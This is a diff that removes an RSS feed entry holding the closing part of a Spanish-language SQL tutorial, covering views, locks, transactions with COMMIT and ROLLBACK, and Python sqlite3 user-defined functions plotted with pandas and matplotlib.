-&lt;/blockquote&gt;
-
-&lt;p&gt;Una ultima cosa es que si queremos borrar los indices, debemos usar &lt;code&gt;DROP INDEX&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query92.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;vistas&quot;&gt;VISTAS &lt;a href=&quot;#vistas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Una &lt;code&gt;vista&lt;/code&gt; es una representacio virtual de una tabla o de una combinación de tablas, por ello podemos pensar en las vistas como una especie de tabla virtual, estas ademas nos permiten simplificar las consultas especialmente cuando son muy complejas y trabajar sobre estas.&lt;/p&gt;
-
-&lt;p&gt;Supongamos que queremos trabajar sobre la tabla de clientes &lt;code&gt;Customers&lt;/code&gt;, solo si estos son de la ciudad de &lt;code&gt;Madrid&lt;/code&gt; o del pais de &lt;code&gt;España&lt;/code&gt;, para ello tendriamos que realizar el filtro.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora si nosostros quisieramos trabajar unicamente con estos datos, tendriamos que aplicar condicionales, joins o entre otras a esta misma consulta.&lt;/p&gt;
-
-&lt;p&gt;Pero lo que podemos hacer seria crear una &lt;code&gt;vista&lt;/code&gt;, esto lo hacemos con &lt;code&gt;CREATE VIEW&lt;/code&gt; mas el nombre de la vista que le queremos dar y seguidamente usamos &lt;code&gt;AS&lt;/code&gt; para luego haces referencia a sobre que tabla crear nuestra vista. En este caso sobre el resultado de nuestra consulta anterior.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query94.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que ahora cambia de color, ya que ahora se almaceno como vista, y en consecuencia podemos trabajar directamente sobre ella como si fuera una tabla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query95.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora seguro puedes pensar que podemos usarlas todo el timpo y simplificarnos las tareas…&lt;/p&gt;
-
-&lt;p&gt;Pues no siempre por que debemos recordar que al ejecutar la vista, por detras se sigue ejecutando la consulta que la genero, por lo tanto realiza un consumo en disco y si lo aplicamos muchas veces tambien nos dara un problema de rendimiento.&lt;/p&gt;
-
-&lt;p&gt;Pero nos puede servir muchas ocasiones ya que nos simplifica el estar haciendo la misma consulta para un proposito, lo unico es que si las vamos a utilizar procuremos hacerlo de manera equilibrada.&lt;/p&gt;
-
-&lt;p&gt;Y una cosa mas para borrar una &lt;code&gt;vista&lt;/code&gt;, debemos ejecutar &lt;code&gt;DROP VIEW&lt;/code&gt; y el nombre de la vista.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query96.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;pero aqui una observación y es que si ejecutamos el comando nuevamente nos devuelve un error.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query97.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por ello igualmente que cuando creamos una tabla se recomienda usar el &lt;code&gt;IF EXISTS&lt;/code&gt; y de este modo verifica que la vista exista antes de borrarla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query98.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;de esta forma ya no nos muestra el error.&lt;/p&gt;
-
-&lt;h2 id=&quot;bloqueos&quot;&gt;BLOQUEOS &lt;a href=&quot;#bloqueos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los bloqueos son los mecanismos de la bae de datos, que se utilizan para para controlar el acceso concurrente a la base de datos. Esto para evitar que en el proceso se realizen cambios conflictivos o se acceda al mismo tiempo a los datos.&lt;/p&gt;
-
-&lt;p&gt;Supongamos tenemos &lt;code&gt;$500&lt;/code&gt; dolares en nuestra cuenta bancaria, pero que pasaria si desde los lugares hacemos un retiro al mismo tiempo, pues lo que sucederia es que nuestra cuenta se quedaria con un valor negativo de &lt;code&gt;-$500&lt;/code&gt; y en vista que eso no puede suceder para ello es que suceden estos mecanismo de bloqueo.&lt;/p&gt;
-
-&lt;p&gt;Existen dos tipos de bloqueos:&lt;/p&gt;
-
-&lt;h2 id=&quot;bloqueos-compartidos-shared-locks&quot;&gt;BLOQUEOS COMPARTIDOS - SHARED LOCKS &lt;a href=&quot;#bloqueos-compartidos-shared-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En este tipo de bloqueo nadie de los usuarios puede escribir, pero si pueden leer. En sintesis cuando nosotros estamos leyendo la base de datos ninguna de las otras conexiones puede escribir, pero si pueden leer.&lt;/p&gt;
-
-&lt;h2 id=&quot;bloqueos-reservados-reserved-locks&quot;&gt;BLOQUEOS RESERVADOS - RESERVED LOCKS &lt;a href=&quot;#bloqueos-reservados-reserved-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es este tipo de bloqueo se aplica cuando estamos escribiendo en la base de datos y en ese momento las otras conexiones no pueden escribir pero si pueden leer.&lt;/p&gt;
-
-&lt;h2 id=&quot;bloqueos-exclusivos-exclusive-locks&quot;&gt;BLOQUEOS EXCLUSIVOS - EXCLUSIVE LOCKS &lt;a href=&quot;#bloqueos-exclusivos-exclusive-locks&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;En este tipo de bloqueos se da cuando mientras estamos escribiendo, las demas conexiones no puedan leer y tampoco puedan escribir, o en un caso mas especifico podemos manipularnos segun nos convenga.&lt;/p&gt;
-
-&lt;h2 id=&quot;transacciones-begin-transaction&quot;&gt;TRANSACCIONES - BEGIN TRANSACTION &lt;a href=&quot;#transacciones-begin-transaction&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Son una secuencia de operaciones que se consideran como una unidad logica, estas aseguran que todas las operaciones dentro de ellas se completen de manera exitosa o por el contrario se deshagan en caso de erro.&lt;/p&gt;
-
-&lt;p&gt;Para iniciar una nueva transaccion usamos &lt;code&gt;BEGIN TRANSACTION&lt;/code&gt; o solo &lt;code&gt;BEGIN&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Despues podemos hacer la alteración que queramos en las tablas de la base de datos, por ejemplo puedo cambiar el nombre a un producto, en este caso a &lt;code&gt;Chang&lt;/code&gt; y renombrarlo como &lt;code&gt;Refrescos&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Como son consultas separadas debemos hay que separarlas con un &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query99.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues de ejecutar la consulta y visualizamos que se cambia el nombre del producto.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query100.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Es aqui donde entran a las transacciones ya que si bien realizamos el cambio, tenemos dos opciones la primera es que si estamos seguros de guardar los cambios ejecutemos &lt;code&gt;COMMIT&lt;/code&gt;, pero en caso de existir un error y queramos volver a la acción anterior y no se efectuen &lt;code&gt;ROLLBACK&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Primero ejecutamos &lt;code&gt;COMMIT&lt;/code&gt;,  de esta manera se efectuan los cambios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query101.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora supongamos que por error modificamos los nombres de todos los productos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query102.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Verificamos y efectivamente se realizaron los cambios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query103.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podriamos pensar que hemos arruinado nuestra base de datos, pero ya que iniciamos una transacción, como mencionaba anteriormente con &lt;code&gt;ROLLBACK&lt;/code&gt;, podemos restaurar los cambios, de modo tal que estos no se guarden.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query104.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y de esta manera ya tenemos claro primero debemos iniciar una transacción con &lt;code&gt;BEGIN&lt;/code&gt;, y una vez se haaya iniciado podemos ejecutar la consulta que queramos de modo tal que si despues queremos guardar los cambio ejecutar un &lt;code&gt;COMMIT&lt;/code&gt;, y si de lo contrario queremos resturarlos usamos &lt;code&gt;ROLLBACK&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;procedimientos-almacenados&quot;&gt;PROCEDIMIENTOS ALMACENADOS &lt;a href=&quot;#procedimientos-almacenados&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es un conjunto de instrucciones que se almancenan en la base de datos y que podemos ejecutarlos cuando queramos para reducir la repetición del codigo, mejora la seguridad por que se limita el acceso directo a la base de datos y aumenta el rendimiento ya que estas operaciones se ejecutan en el servidor de la propia base de datos.&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;sqlite3&lt;/code&gt; se caracteriza por ser ligero de y facil implementación ya ejecuta como una biblioteca y por lo tanto no soporta procedimientos almacenados por que en principio no los necesita ya que se integra directamente en la aplicación que lo utiliza lo que facilita su portabilidad y en consecuencia es sencillo implementarlo en distintas plataformas y sistemas operativos.&lt;/p&gt;
-
-&lt;p&gt;Por lo tanto cuando queremos ejecutar procedimientos almacenados con &lt;code&gt;sqlite3&lt;/code&gt; lo hacemos desde el backend o lenguaje anfitrion a nivel de aplicación, usando las funciones del lenguaje y aunque estas funciones que podamos definir no son iguales a las de los procedimientos almacenados viene a ser la solución a este problema.&lt;/p&gt;
-
-&lt;h2 id=&quot;sql-y-python&quot;&gt;SQL Y PYTHON &lt;a href=&quot;#sql-y-python&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Como mencionamos anteriormente en el apartado anterior necesitamos de un lenguaje para ejecutar nuestras funciones definidas por el usuario y para ello usaremos nada mas y nada menos que &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;funciones-definidas-por-el-usuario&quot;&gt;FUNCIONES DEFINIDAS POR EL USUARIO - USER DEFINED FUNCTIONS &lt;a href=&quot;#funciones-definidas-por-el-usuario&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Son funciones que podemos crear y utilizar dentro de nuestras consultas &lt;code&gt;SQL&lt;/code&gt;. Estas funciones permiten ampliar las funcionalidades de &lt;code&gt;SQLite&lt;/code&gt; realizando calculos o manipulaciones de datos especificos que no estas directamente disponibles en las funciones integradas.&lt;/p&gt;
-
-&lt;p&gt;Y para ello para definir estas funciones utilizaremos &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Comenzaremos importando la libreria de &lt;code&gt;SQLite&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues crearemos una función, en este caso una que nos devuelva el 20% de un valor que reciba como parametro.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def calcular_porcentaje(valor):
-    porcentaje = valor * 0.20
-    return porcentaje
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ya que tenemos nuestra función, ahora procederemos a crear una conexión con nuestra base de datos en este caso &lt;code&gt;Northwind.db&lt;/code&gt; y la guardaremos en la variable &lt;code&gt;conn&lt;/code&gt;. Ojo se debe espeficiar la ruta en donde tengas la db.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;conn = sqlite3.connect(&quot;Northwind.db&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora tenemos que registrar nuestra función en nuestra conexión con&lt;code&gt;SQLite&lt;/code&gt;, para ello usamos el metodo &lt;code&gt;create_function&lt;/code&gt; y como primer parametro especificamos el nombre que tendra la función en &lt;code&gt;SQLite&lt;/code&gt; que puedes llamarla como quieras, en este caso la llamare &lt;code&gt;Porcentaje&lt;/code&gt;, despues como segundo valor debemos espeficar el numero de parametros de nuestra función creada que en este caso es &lt;code&gt;1&lt;/code&gt; y finalmente como tercer parametro nuestra función &lt;code&gt;calcular_porcentaje&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez ya tengamos registrada nuestra función, ahora necesitamos crear es algo que nos permite hacer una consulta a la base de datos y obtener una respuesta con todos los datos ya procesados y para ello en &lt;code&gt;Python&lt;/code&gt;, tenemos algo que se llaman &lt;code&gt;cursores&lt;/code&gt; que nos devolveran los resultados ya formateados.&lt;/p&gt;
-
-&lt;p&gt;Asi que creamos un &lt;code&gt;cursor&lt;/code&gt; y lo guardamos en la variable cursor.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor = conn.cursor()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente es ejecutar la consulta y eso lo hacemos con &lt;code&gt;cursor.execute&lt;/code&gt; y dentro podemos ejecutar la consulta que queramos, para este caso vamos a hacer una consulta donde vamos a seleccionar el nombre de los productos de la tabla &lt;code&gt;Products&lt;/code&gt;, el precio normal y ademas nuevamente el precio pero en este es donde vamos a ejecutar nuestra función &lt;code&gt;porcentaje&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor.execute('SELECT ProductName, porcentaje(Price) FROM PRODUCTS')
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Los resultados de la consulta vamos a almacenarlos en la variable &lt;code&gt;resultados&lt;/code&gt; y para obtenerlos usaremos el metodo &lt;code&gt;fetchall()&lt;/code&gt; que se utiliza para recuperar todas las filas del conjunto de resultados de una consulta.&lt;/p&gt;
-
-&lt;p&gt;En el caso en el que solo quisieramos recuperar solo una fila, usariamos &lt;code&gt;fetchone()&lt;/code&gt;. Como en este caso queremos el resultado de varias filas usamos &lt;code&gt;fetchall()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;resultados = cursor.fetchall()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Finalmente cerrar el cursor y la conexión para liberar los recursos usados.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;cursor.close()
-conn.close()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y ahora si imprimimos los resultados, nos lo devolvera en crudo, de tal forma que no sera bien legible. Para solucionar este problema usaremos otra libreria de &lt;code&gt;Python&lt;/code&gt; llamada &lt;code&gt;pandas&lt;/code&gt; y con ellas vamos a exportar el resultado en un &lt;code&gt;dataframe&lt;/code&gt; que basicamente nos permitira mostrar la información en una especie de tablas.&lt;/p&gt;
-
-&lt;p&gt;Por lo tanto nuestro codigo completo nos quedaria asi:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
-import pandas as pd
-
-def calcular_porcentaje(valor):
-    porcentaje = valor * 0.20
-    return porcentaje
-
-conn = sqlite3.connect(&quot;Northwind.db&quot;)
-
-conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)
-
-cursor = conn.cursor()
-
-cursor.execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')
-
-resultados = cursor.fetchall()
-
-df_resultados = pd.DataFrame(resultados)
-
-print(df_resultados)
-
-cursor.close()
-
-conn.close()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Al ejecutar nos da como resultado de una majera mas legible los resultados.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query105.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Todo esto que acabamos de hacer es una transacción, ya que estas se inician por el lenguaje anfitrion, tras bambalinas lo que esta haciendo &lt;code&gt;Python&lt;/code&gt; es hacer un &lt;code&gt;BEGIN&lt;/code&gt; automaticamente, entonces una vez que realizamos toda la conexión si queremos que se guarden los cambios hay que usar exacto un &lt;code&gt;COMMIT&lt;/code&gt; y de esta manera hubieramos ejecutado correctamente la conexión.&lt;/p&gt;
-
-&lt;p&gt;Pero existe una manera mas sencilla y optima para hacer exactamente lo mismo, esto nos ayudaria a simplificar nuestro codigo y evitar estar cerrando estas conexiones. Para esto tendriamos que usar &lt;code&gt;with&lt;/code&gt; y manejar los errores con un &lt;code&gt;Try Catch&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Voy a explicar como funciona y por que es mas optimo usar esta opción - aunque en el curso de &lt;code&gt;Python&lt;/code&gt; veremos esto a detalle:&lt;/p&gt;
-
-&lt;p&gt;Bueno principalmente es mas optimo, puesto que cuando usamos &lt;code&gt;with&lt;/code&gt; para conectarnos a la base de datos nos va a garantizar que la conexión se cierre automaticamente al finalizar el bloque de codigo y nos asegura que los recursos de la conexión que establecimos se liberen correctamente aunque ocurran exepciones.&lt;/p&gt;
-
-&lt;p&gt;Pero para estar seguro tambien usaremos un &lt;code&gt;Try Catch&lt;/code&gt;, donde manejaremos las exepciones en el caso pueda existir alguna:&lt;/p&gt;
-
-&lt;p&gt;Como primera exepción usamos &lt;code&gt;sqlite3.Error&lt;/code&gt; que capturara los errores especificos de &lt;code&gt;SQLite&lt;/code&gt; de haberlos y nos mostrara a cual corresponde en pantalla.&lt;/p&gt;
-
-&lt;p&gt;Despues una exepción general con &lt;code&gt;Exception&lt;/code&gt;, si es que el problema no se da necesariamente con &lt;code&gt;SQLite&lt;/code&gt; y de esta manera tambien nos lo reporte al ocurrir.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
-import pandas as pd
-
-def calcular_porcentaje(valor):
-    porcentaje = valor * 0.20
-    return porcentaje
-
-Try:
-    with sqlite3.connect(&quot;Northwind.db&quot;) as conn:
-
-        conn.create_function(&quot;porcentaje&quot;, 1, calcular_porcentaje)
-
-        cursor = conn.cursor()
-
-        cursor.execute('SELECT ProductName, Price, porcentaje(Price) FROM PRODUCTS')
-
-        resultados = cursor.fetchall()
-
-        df_resultados = pd.DataFrame(resultados)
-
-        print(df_resultados)
-
-except sqlite3.Error as e:
-    print(&quot;Error en la base de datos: &quot;, e)
-except Exception as e:
-    print(&quot;Error global: &quot;, e)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora para cerrar el cursor, vamos a realizar un ejemplo un poco mas complejo igual desde &lt;code&gt;Python&lt;/code&gt; donde de nuestra base de datos trataremos de obtener los 3 empleados que generaron mas ingresos en general.&lt;/p&gt;
-
-&lt;p&gt;Para ello primero armaremos la estructura de nuestro codigo y importaremos la libreria &lt;code&gt;matplotlib&lt;/code&gt; para visualizarlo los resultados graficamente y esta vez como estamos usando &lt;code&gt;pandas&lt;/code&gt; vamos a usar una función que nos permite leer una consulta &lt;code&gt;SQL&lt;/code&gt; la cual es &lt;code&gt;pd.read_sql_query&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
-import pandas as pd
-import matplotlib.pyplot as plt
-
-consulta = '''
-
-    
-'''
-with sqlite3.connect(&quot;Northwind.db&quot;) as conn:
-
-    resultado = pd.read_sql_query(query, conn)
-
-resultado.plot(x=, y=, kind=&quot;bar&quot;, figzise=(10,5), legend=False)
-plt.title(&quot;Empleado que genero mas Ingresos&quot;)
-plt.xlabel(&quot;Nombre Empleado&quot;)
-plt.ylabel(&quot;Monto Total Vendido&quot;)
-plt.xticks(rotation=45)
-plt.show()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a explicarlo paso a paso:&lt;/p&gt;
-
-&lt;p&gt;Con &lt;code&gt;pd.read_sql_query&lt;/code&gt; que recibe dos parametros, en el primero lo que hacemos es que directamente le pasamos la consulta que queramos ejecutar y como segundo parametro la conexión que esta almancenada en &lt;code&gt;conn&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Despues usamos la libreria &lt;code&gt;matplotlib.pyplot&lt;/code&gt; para crear un &lt;code&gt;plot&lt;/code&gt; que se refiere a crear un grafico, donde con x indicaremos y indicaremos los valores bajo los cuales se creara, que aun no los definimos, despues con &lt;code&gt;kind&lt;/code&gt; indicamos el tipo de grafico que queremos que tenga, en este caso en barras, figzise para indicarle el tamaño que tendra nuestro grafico y despues con &lt;code&gt;legend&lt;/code&gt; si queremos que tenga una leyenda, en este caso no quiero que se vea por ese le pongo &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Despues con &lt;code&gt;plt.title&lt;/code&gt;, le damos un nombre a nuestra grafica, &lt;code&gt;plt.xlabel&lt;/code&gt; para ponerle un nombre en el eje &lt;code&gt;X&lt;/code&gt; y &lt;code&gt;plt.ylabel&lt;/code&gt; lo mismo para el eje &lt;code&gt;Y&lt;/code&gt;. Despues con &lt;code&gt;xticks&lt;/code&gt; le decimos que el nombre del eje &lt;code&gt;X&lt;/code&gt;, tenga una rotación de 45 grados para que los nombres no salgan uno encima de otro.&lt;/p&gt;
-
-&lt;p&gt;Finalmente con &lt;code&gt;plt.show()&lt;/code&gt; le decimos que nos muestre el grafico.&lt;/p&gt;
-
-&lt;p&gt;Ahora en lo que respecta a nuestra consulta, como queremos seleccionar el empleado que genero mas ingresos, primero vamos a seleccionar los datos del empleado y la suma de la cantidad vendida &lt;code&gt;Quantity&lt;/code&gt; referente a la tabla &lt;code&gt;OrderDetails&lt;/code&gt; por el &lt;code&gt;Precio&lt;/code&gt; correspondiente a la tabla &lt;code&gt;Products&lt;/code&gt; esto de la tabla &lt;code&gt;Employees&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query106.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues vamos a aplicar un &lt;code&gt;JOIN&lt;/code&gt; y buscaremos las coincidencias de las tablas partiendo de &lt;code&gt;Employees&lt;/code&gt; hasta la tabla &lt;code&gt;OrderDetails&lt;/code&gt; donde tenemos la cantidad y a su vez hasta la tabla &lt;code&gt;Products&lt;/code&gt; donde tenemos el precio.&lt;/p&gt;
-
-&lt;p&gt;Esto aunque puede parecer complicado lo haremos basandonos en los &lt;code&gt;ID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query107.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues solo debemos agruparlo basandonos en el &lt;code&gt;EmployeeID&lt;/code&gt; ya que justamente queremos saber el empleado que genero esos ingresos y finalmente debemos ordenarlo por el &lt;code&gt;total_vendido&lt;/code&gt; y establecer un &lt;code&gt;LIMIT&lt;/code&gt; de los tres primeros.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query108.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente debemos añadir esa consulta a nuestra variable &lt;code&gt;consulta&lt;/code&gt; en nuestro codigo y completar tambien los parametros que faltaban en el &lt;code&gt;plot&lt;/code&gt; donde &lt;code&gt;x=Empleado&lt;/code&gt; y &lt;code&gt;y=total_vendido&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sqlite3
-import pandas as pd
-import matplotlib.pyplot as plt
-
-consulta = '''
-  SELECT Firstname || &quot;&quot; || LastName as Empleado, SUM(od.Quantity * p.Price) AS total_vendido
-  FROM Employees e
-  JOIN Orders o ON e.EmployeeID = o.EmployeeID
-  JOIN OrderDetails od ON o.OrderID = od.OrderID
-  JOIN Products p ON od.ProductID = p.ProductID
-  GROUP BY e.EmployeeID
-  ORDER BY total_vendido DESC
-  LIMIT 3
-'''
-with sqlite3.connect(&quot;Northwind.db&quot;) as conn:
-
-    resultado = pd.read_sql_query(query, conn)
-
-resultado.plot(x=, y=, kind=&quot;bar&quot;, figzise=(10,5), legend=False)
-plt.title(&quot;Empleado que genero mas Ingresos&quot;)
-plt.xlabel(&quot;Nombre Empleado&quot;)
-plt.ylabel(&quot;Monto Total Vendido&quot;)
-plt.xticks(rotation=45)
-plt.show()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El codigo en &lt;code&gt;python&lt;/code&gt; nos quedaria de esta manera, ahora solo debemos ejecutarlo y obtendremos graficamente los tres empleados que generaron mas ingresos a la empresa.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query109.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y esto seria todo con respecto al curso de &lt;code&gt;SQL&lt;/code&gt;, ahora si estas listo para administrar cualquier base de datos &lt;code&gt;SQL&lt;/code&gt;, espero haberte ayudado. 😃&lt;/p&gt;
-
-&lt;p&gt;Conmigo sera hasta la proxima vez 😄.&lt;/p&gt;
-
-</description>
-        <pubDate>Tue, 20 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/articulos/SQL</link>
-        <guid isPermaLink="true">http://localhost:4000/articulos/SQL</guid>
-        
-        <category>Sql</category>
-        
-        <category>programación</category>
-        
-        <category>Query</category>
-        
-        <category>Database</category>
-        
-        
-        <category>articulos</category>
         
       </item>
     
